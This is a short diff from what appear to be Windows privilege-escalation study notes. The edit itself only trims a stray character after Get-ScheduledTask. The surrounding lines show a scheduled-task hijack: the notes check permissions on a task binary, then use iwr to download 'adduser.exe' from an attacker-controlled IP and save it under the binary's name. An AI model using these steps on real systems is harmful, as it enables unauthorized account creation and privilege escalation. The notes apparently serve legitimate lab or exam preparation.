@@ -161,7 +161,7 @@ Restart-Service BetaService
 
 ###### Scheduled Tasks
 ```
-Get-ScheduledTask / 
+Get-ScheduledTask
 schtasks /query /fo LIST /v
 icacls C:\Users\steve\Pictures\BackendCacheCleanup.exe
 iwr -Uri http://192.168.119.3/adduser.exe -Outfile BackendCacheCleanup.exe
